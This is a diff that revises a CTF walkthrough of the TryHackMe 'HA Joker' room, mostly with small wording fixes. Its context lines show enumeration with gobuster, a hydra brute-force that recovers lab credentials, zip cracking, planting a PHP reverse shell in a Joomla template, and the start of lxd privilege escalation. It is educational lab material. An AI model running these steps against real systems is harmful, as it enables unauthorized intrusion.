@@ -41,17 +41,17 @@ PORT     STATE SERVICE VERSION
 | HTTP/1.1 401 Unauthorized\x0D
 ~~~
 
-We can see that the Apache version and also we find out that port 8080 needs authentication.
+We can see the Apache version and also we find out that port 8080 requiers authentication.
 
 Apache version: `2.4.29`
 
 Port with no authentication needed: `80`
 
-# Enumeration
+# Webpage
 
-## Webpage
+## Enumeration
 
-We don't have creds to connect to SSH service or login to port 8080. Let's head to port 80. We can't find anything interesting from the page itself, so let's run `gobuster` on it to find directories with `-x` flag to find files with certain extentions which can be useful. ( I cleaned the result a bit.)
+We don't have creds to connect to SSH service or login on port 8080. Let's head to port 80. We can't find anything interesting from the page itself, so let's run `gobuster` on it to find directories. I ran it with `-x` flag to find files with certain extentions which can be useful. ( I cleaned the result a bit.)
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
@@ -99,7 +99,7 @@ Username: `joker`
 
 ## Brute-forcing port 8080
 
-As we can see, the word **rock** has been used a few times which is probably refering to the famous `rockyou` wordlist which you can download [here](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjalMrg5MTzAhUSzqQKHSc5C2UQFnoECAUQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd). We can try to brute-force the http page on port 8080 which requiers creds. I used `hydra` to brute-force the password  for user `joker` using rockyou wordlist.
+As we can see, the word **"rock"** has been used a few times which is probably refering to the famous `rockyou` wordlist which you can download [here](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjalMrg5MTzAhUSzqQKHSc5C2UQFnoECAUQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd). We can try to brute-force the http page on port 8080 which requiers creds. I used `hydra` to brute-force the password for user `joker` using rockyou wordlist.
 
 Port with authentication: `8080`
 
@@ -121,7 +121,7 @@ Joker's password: `hannah`
 
 ## More Enumeration
 
-Now that we have access to this port, in order to gain a shell, we have to get access to admin panel. The first thing I do is to check `/robots.txt` which can reveal us some important directories. This page includes the login page for admin panel.
+Now that we have access to this port which is the page with CMS installed on it, in order to gain a shell, we have to get access to admin panel. The first thing I do is to check `/robots.txt` which can reveal us some important directories. This page includes the login page for admin panel.
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
@@ -143,7 +143,7 @@ Now that we have access to this port, in order to gain a shell, we have to get a
 # http://tool.motoricerca.info/robots-checker.phtml
 
 User-agent: *
-Disallow: /administrator/
+Disallow: /administrator/      <-------------------
 Disallow: /bin/
 Disallow: /cache/
 Disallow: /cli/
@@ -161,7 +161,7 @@ Disallow: /tmp/
 
 Admin directory: `/administrator/`
 
-We need to find the creds to login to admin panel. Let's run `gobuster` again to see if we can find anything else. (I used `-x` flag again to find files with certain extentions). You can use `-U` and `-P` to enter the creds for the authentication.
+We need to find the creds to login to admin panel. Let's run `gobuster` on admin login page to see if we can find anything else. (I used `-x` flag again to find files with certain extentions). You can use `-U` and `-P` to enter the creds for the authentication.
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
@@ -207,7 +207,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Backup file: `backup.zip`
 
-We found a backup file. I downloaded the zip file and when I tried to extract it, I was asked for a passphrase. Before I try to crack it, I tried `hannah` and it worked (Always test password reuse!). If it didn't, we had to use `zip2john` and then crack it with `john`.
+We found a backup file. I downloaded the zip file and when I tried to extract it, I was asked for a passphrase. Before I try to crack it, I tried `hannah` and it worked (Always test for password reuse!). If it didn't, we had to use `zip2john` and then crack it with `john`.
 
 Zip file passphrase: `hannah`
 
@@ -282,7 +282,7 @@ Session completed
 
 Admin's password: `abcd1234`
 
-## Reverse Shell
+# Reverse Shell
 
 Now we can login to admin panel and upload a reverse shell. Navigate to `Configuration > Templates > Templates > Beez3 Details and Files` and choose `error.php` and replace it with a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't forget to change the IP in the code to yours.
 
@@ -298,14 +298,13 @@ Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
 /bin/sh: 0: can't access tty; job control turned off
-id
+$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
-whoami
+$ whoami
 www-data
-which python
-which python3
+$ which python3
 /usr/bin/python3
-python3 -c "import pty;pty.spawn('/bin/bash')"
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
 www-data@ubuntu:/$
 ~~~
 
@@ -315,7 +314,7 @@ Group: `lxd`
 
 ## Privilege Escalation
 
-Now we need to gain root access. Since we are in lxd group, we can use this to get access to root files. Let's list the images installed on the machine:
+Now we need to gain root access. Since we are in lxd group, we can try to get access to root files. Let's list the images installed on the machine:
 
 ~~~
 $ lxc image list
@@ -325,7 +324,7 @@ $ lxc image list
 
 ~~~
 
-There is no image installed. There is supposed to be `myalpine`. We can install it ourselves. Do the following steps on your machine:
+There is no images installed. There is supposed to be `myalpine`. We can install it ourselves. Do the following steps on your machine:
 ~~~
 $ git clone https://github.com/saghul/lxd-alpine-builder.git
 $ cd lxd-alpine-builder
